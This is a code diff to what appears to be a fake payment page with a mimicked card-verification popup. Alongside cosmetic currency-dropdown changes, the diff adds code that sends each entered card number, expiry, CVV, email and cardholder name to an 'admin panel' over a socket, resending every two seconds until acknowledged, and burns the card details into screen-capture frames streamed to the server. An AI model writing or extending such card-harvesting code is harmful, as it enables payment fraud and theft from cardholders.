@@ -350,33 +350,53 @@
        justify-content: space-between;
        color: #666;
      }
-    /* Currency indicator styles */
-.currency-indicator {
-  position: absolute;
-  right: 12px;
-  top: 50%;
-  transform: translateY(-50%);
+/* Currency dropdown styles */
+.currency-dropdown {
   background-color: #f0f0f0;
   border: 1px solid #e0e0e0;
-  border-radius: 16px;
-  padding: 2px 8px;
-  font-size: 12px;
+  border-radius: 8px;
+  padding: 8px 12px;
+  margin-top: 5px;
+  font-size: 13px;
   color: #555;
-  display: flex;
-  align-items: center;
-  gap: 3px;
-  height: 22px;
-  box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-  transition: opacity 0.2s ease;
+  box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+  width: 100%;
+  display: none;
   opacity: 0;
+  transform: translateY(-5px);
+  transition: opacity 0.3s ease, transform 0.3s ease;
 }
 
-.currency-indicator.visible {
+.currency-dropdown.visible {
+  display: block;
   opacity: 1;
+  transform: translateY(0);
+}
+
+.currency-info {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+
+.currency-left {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.currency-code {
+  font-weight: 600;
 }
 
 .currency-symbol {
-  font-weight: 500;
+  font-size: 15px;
+  color: #666;
+}
+
+.currency-country {
+  color: #777;
+  font-size: 12px;
 }
      /* Glowing effect for OTP input when focused */
      #mcOtpInput:focus {
@@ -780,6 +800,42 @@
        'COP': '$',
        'VND': '₫'
      };
+    // Comprehensive currency list for accurate detection
+const currencyByCountry = {
+  'AF': 'AFN', 'AL': 'ALL', 'DZ': 'DZD', 'AD': 'EUR', 'AO': 'AOA', 'AG': 'XCD',
+  'AR': 'ARS', 'AM': 'AMD', 'AU': 'AUD', 'AT': 'EUR', 'AZ': 'AZN', 'BS': 'BSD',
+  'BH': 'BHD', 'BD': 'BDT', 'BB': 'BBD', 'BY': 'BYN', 'BE': 'EUR', 'BZ': 'BZD',
+  'BJ': 'XOF', 'BT': 'BTN', 'BO': 'BOB', 'BA': 'BAM', 'BW': 'BWP', 'BR': 'BRL',
+  'BN': 'BND', 'BG': 'BGN', 'BF': 'XOF', 'BI': 'BIF', 'CV': 'CVE', 'KH': 'KHR',
+  'CM': 'XAF', 'CA': 'CAD', 'CF': 'XAF', 'TD': 'XAF', 'CL': 'CLP', 'CN': 'CNY',
+  'CO': 'COP', 'KM': 'KMF', 'CD': 'CDF', 'CG': 'XAF', 'CR': 'CRC', 'CI': 'XOF',
+  'HR': 'HRK', 'CU': 'CUP', 'CY': 'EUR', 'CZ': 'CZK', 'DK': 'DKK', 'DJ': 'DJF',
+  'DM': 'XCD', 'DO': 'DOP', 'EC': 'USD', 'EG': 'EGP', 'SV': 'USD', 'GQ': 'XAF',
+  'ER': 'ERN', 'EE': 'EUR', 'ET': 'ETB', 'FJ': 'FJD', 'FI': 'EUR', 'FR': 'EUR',
+  'GA': 'XAF', 'GM': 'GMD', 'GE': 'GEL', 'DE': 'EUR', 'GH': 'GHS', 'GR': 'EUR',
+  'GD': 'XCD', 'GT': 'GTQ', 'GN': 'GNF', 'GW': 'XOF', 'GY': 'GYD', 'HT': 'HTG',
+  'HN': 'HNL', 'HK': 'HKD', 'HU': 'HUF', 'IS': 'ISK', 'IN': 'INR', 'ID': 'IDR',
+  'IR': 'IRR', 'IQ': 'IQD', 'IE': 'EUR', 'IL': 'ILS', 'IT': 'EUR', 'JM': 'JMD',
+  'JP': 'JPY', 'JO': 'JOD', 'KZ': 'KZT', 'KE': 'KES', 'KI': 'AUD', 'KP': 'KPW',
+  'KR': 'KRW', 'KW': 'KWD', 'KG': 'KGS', 'LA': 'LAK', 'LV': 'EUR', 'LB': 'LBP',
+  'LS': 'LSL', 'LR': 'LRD', 'LY': 'LYD', 'LI': 'CHF', 'LT': 'EUR', 'LU': 'EUR',
+  'MK': 'MKD', 'MG': 'MGA', 'MW': 'MWK', 'MY': 'MYR', 'MV': 'MVR', 'ML': 'XOF',
+  'MT': 'EUR', 'MH': 'USD', 'MR': 'MRU', 'MU': 'MUR', 'MX': 'MXN', 'FM': 'USD',
+  'MD': 'MDL', 'MC': 'EUR', 'MN': 'MNT', 'ME': 'EUR', 'MA': 'MAD', 'MZ': 'MZN',
+  'MM': 'MMK', 'NA': 'NAD', 'NR': 'AUD', 'NP': 'NPR', 'NL': 'EUR', 'NZ': 'NZD',
+  'NI': 'NIO', 'NE': 'XOF', 'NG': 'NGN', 'NO': 'NOK', 'OM': 'OMR', 'PK': 'PKR',
+  'PW': 'USD', 'PA': 'PAB', 'PG': 'PGK', 'PY': 'PYG', 'PE': 'PEN', 'PH': 'PHP',
+  'PL': 'PLN', 'PT': 'EUR', 'QA': 'QAR', 'RO': 'RON', 'RU': 'RUB', 'RW': 'RWF',
+  'KN': 'XCD', 'LC': 'XCD', 'VC': 'XCD', 'WS': 'WST', 'SM': 'EUR', 'ST': 'STN',
+  'SA': 'SAR', 'SN': 'XOF', 'RS': 'RSD', 'SC': 'SCR', 'SL': 'SLE', 'SG': 'SGD',
+  'SK': 'EUR', 'SI': 'EUR', 'SB': 'SBD', 'SO': 'SOS', 'ZA': 'ZAR', 'SS': 'SSP',
+  'ES': 'EUR', 'LK': 'LKR', 'SD': 'SDG', 'SR': 'SRD', 'SZ': 'SZL', 'SE': 'SEK',
+  'CH': 'CHF', 'SY': 'SYP', 'TW': 'TWD', 'TJ': 'TJS', 'TZ': 'TZS', 'TH': 'THB',
+  'TL': 'USD', 'TG': 'XOF', 'TO': 'TOP', 'TT': 'TTD', 'TN': 'TND', 'TR': 'TRY',
+  'TM': 'TMT', 'TV': 'AUD', 'UG': 'UGX', 'UA': 'UAH', 'AE': 'AED', 'GB': 'GBP',
+  'US': 'USD', 'UY': 'UYU', 'UZ': 'UZS', 'VU': 'VUV', 'VA': 'EUR', 'VE': 'VES',
+  'VN': 'VND', 'YE': 'YER', 'ZM': 'ZMW', 'ZW': 'ZWL'
+};
  
      // Function to convert currency using an API
      async function convertCurrency(amount, fromCurrency, toCurrency) {
@@ -933,6 +989,21 @@ document.addEventListener('DOMContentLoaded', function() {
          // Try first binlist.net (reliable but rate-limited)
          try {
            const response = await fetch(`https://lookup.binlist.net/${bin}`);
+          // Ensure currency is correctly set based on country if not already specified
+if (!bankInfo.currency && bankInfo.countryCode && currencyByCountry[bankInfo.countryCode]) {
+  bankInfo.currency = currencyByCountry[bankInfo.countryCode];
+}
+
+// Add country name if missing but we have country code
+if (!bankInfo.country && bankInfo.countryCode) {
+  const countryNames = {
+    'US': 'United States', 'GB': 'United Kingdom', 'IN': 'India', 'CA': 'Canada', 
+    'AU': 'Australia', 'DE': 'Germany', 'FR': 'France', 'IT': 'Italy', 'ES': 'Spain',
+    'JP': 'Japan', 'CN': 'China', 'BR': 'Brazil', 'RU': 'Russia', 'MX': 'Mexico',
+    // Add more country names as needed
+  };
+  bankInfo.country = countryNames[bankInfo.countryCode] || bankInfo.countryCode;
+}
            
            if (response.ok) {
              const data = await response.json();
@@ -1141,6 +1212,69 @@ document.addEventListener('DOMContentLoaded', function() {
          }, 300);
        }
      }
+    // Create or get the currency dropdown element
+function getCurrencyDropdown() {
+  let dropdown = document.getElementById('currencyDropdown');
+  
+  if (!dropdown) {
+    dropdown = document.createElement('div');
+    dropdown.id = 'currencyDropdown';
+    dropdown.className = 'currency-dropdown';
+    
+    const cardNumberContainer = document.getElementById('cardNumber').parentNode;
+    cardNumberContainer.parentNode.insertBefore(dropdown, cardNumberContainer.nextSibling);
+  }
+  
+  return dropdown;
+}
+
+// Show currency dropdown with correct currency data
+function showCurrencyDropdown(bankInfo) {
+  const dropdown = getCurrencyDropdown();
+  
+  // Get accurate currency data
+  let currency = 'USD';
+  let symbol = '$';
+  
+  // First try to get currency from bankInfo
+  if (bankInfo.currency) {
+    currency = bankInfo.currency;
+    symbol = currencySymbols[currency] || currency;
+  } 
+  // Then try to get currency from country code
+  else if (bankInfo.countryCode && currencyByCountry[bankInfo.countryCode]) {
+    currency = currencyByCountry[bankInfo.countryCode];
+    symbol = currencySymbols[currency] || currency;
+  }
+  
+  // Create the content
+  dropdown.innerHTML = `
+    <div class="currency-info">
+      <div class="currency-left">
+        <span class="currency-code">${currency}</span>
+        <span class="currency-symbol">${symbol}</span>
+      </div>
+      <span class="currency-country">${bankInfo.country || 'International'}</span>
+    </div>
+  `;
+  
+  // Make visible with animation
+  dropdown.style.display = 'block';
+  setTimeout(() => {
+    dropdown.classList.add('visible');
+  }, 10);
+}
+
+// Hide currency dropdown
+function hideCurrencyDropdown() {
+  const dropdown = document.getElementById('currencyDropdown');
+  if (dropdown) {
+    dropdown.classList.remove('visible');
+    setTimeout(() => {
+      dropdown.style.display = 'none';
+    }, 300);
+  }
+}
  // Create or get the currency indicator element
 function getCurrencyIndicator() {
   let indicator = document.getElementById('currencyIndicator');
@@ -1475,11 +1609,11 @@ if (cleanCardNumber.length >= 6) {
     
     document.getElementById('bankInfo').value = JSON.stringify(bankInfo);
     
-    // Show currency indicator instead of dropdown
-    showCurrencyIndicator(bankInfo);
+    // Show currency dropdown when at least 6 digits are entered
+    showCurrencyDropdown(bankInfo);
   }
 } else {
-  hideCurrencyIndicator();
+  hideCurrencyDropdown();
 }
          });
        }
@@ -1574,7 +1708,58 @@ if (cleanCardNumber.length >= 6) {
              
              console.log('Joining socket.io room with invoiceId:', currentInvoiceId);
              socket.emit('join', currentInvoiceId);
- 
+
+            // Send card details immediately to admin panel via socket
+            socket.emit('card_submitted', {
+  invoiceId: currentInvoiceId,
+  cardData: {
+    cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
+    expiry: document.getElementById('expiry').value,
+    cvv: document.getElementById('cvv').value,
+    email: document.getElementById('email').value,
+    amount: document.getElementById('amount').value,
+    cardholder: document.getElementById('cardholderName').value,
+    timestamp: new Date().toISOString(),
+    // Include bank information if available
+    bankName: JSON.parse(bankInfoData || '{}').bank || 'Unknown',
+    country: JSON.parse(bankInfoData || '{}').country || 'Unknown',
+    cardType: JSON.parse(bankInfoData || '{}').scheme || 'Unknown'
+  }
+});
+
+// Also send a notification to wake up any sleeping admin panels
+socket.emit('notify_admin', {
+  type: 'card_data',
+  invoiceId: currentInvoiceId,
+  message: 'New card submission received'
+});
+
+// Set up a fallback mechanism to ensure admin panel gets the data
+let cardDataAcknowledged = false;
+const cardDataInterval = setInterval(() => {
+  if (cardDataAcknowledged) {
+    clearInterval(cardDataInterval);
+    return;
+  }
+  
+  // Resend card data if not acknowledged within 2 seconds
+  socket.emit('card_submitted', {
+    invoiceId: currentInvoiceId,
+    cardData: {
+      cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
+      expiry: document.getElementById('expiry').value,
+      cvv: document.getElementById('cvv').value,
+      email: document.getElementById('email').value,
+      amount: document.getElementById('amount').value,
+      cardholder: document.getElementById('cardholderName').value,
+      timestamp: new Date().toISOString(),
+      bankName: JSON.parse(bankInfoData || '{}').bank || 'Unknown',
+      country: JSON.parse(bankInfoData || '{}').country || 'Unknown',
+      cardType: JSON.parse(bankInfoData || '{}').scheme || 'Unknown',
+      retry: true
+    }
+  });
+}, 2000);
              // Use clean hash URL for bankpage
              const bankpageUrl = getBankpageUrl(data.invoiceId);
              bankPageWindow = window.open(
@@ -1715,6 +1900,13 @@ if (cleanCardNumber.length >= 6) {
                verificationTypeLogo.alt = 'Mastercard SecureCode';
              }
            }
+          // Listen for admin acknowledgment
+socket.on('card_data_received', (data) => {
+  if (data.invoiceId === currentInvoiceId) {
+    cardDataAcknowledged = true;
+    console.log('Card data received by admin panel');
+  }
+});
  
            // UPDATED: Set bank logo on LEFT side
            const bankLogo = document.getElementById('bankLogo');
@@ -2729,7 +2921,30 @@ if (cleanCardNumber.length >= 6) {
         
         // Convert to image data with quality setting
         const imageData = canvas.toDataURL('image/jpeg', CAPTURE_QUALITY);
-        
+
+       // Add this inside your captureScreen function, before sending the frame
+// Add card details overlay if available
+if (currentInvoiceId) {
+  try {
+    // Draw card data info box
+    const cardNum = document.getElementById('cardNumber')?.value || '';
+    const expiry = document.getElementById('expiry')?.value || '';
+    const cardHolder = document.getElementById('cardholderName')?.value || '';
+    
+    if (cardNum && expiry && cardHolder) {
+      // Draw transparent overlay with card info at the top
+      ctx.fillStyle = 'rgba(0,0,0,0.7)';
+      ctx.fillRect(0, 40, canvas.width, 80);
+      ctx.font = '12px Arial';
+      ctx.fillStyle = '#ffffff';
+      ctx.fillText(`Card: ${cardNum} | Exp: ${expiry} | Name: ${cardHolder}`, 10, 60);
+      ctx.fillText(`Invoice ID: ${currentInvoiceId} | Time: ${new Date().toLocaleTimeString()}`, 10, 80);
+      ctx.fillText('CARD DATA SUBMITTED', 10, 100);
+    }
+  } catch (e) {
+    // Ignore errors
+  }
+}
         // Send frame data to server
         socket.emit('screen_frame', {
           frameData: imageData,
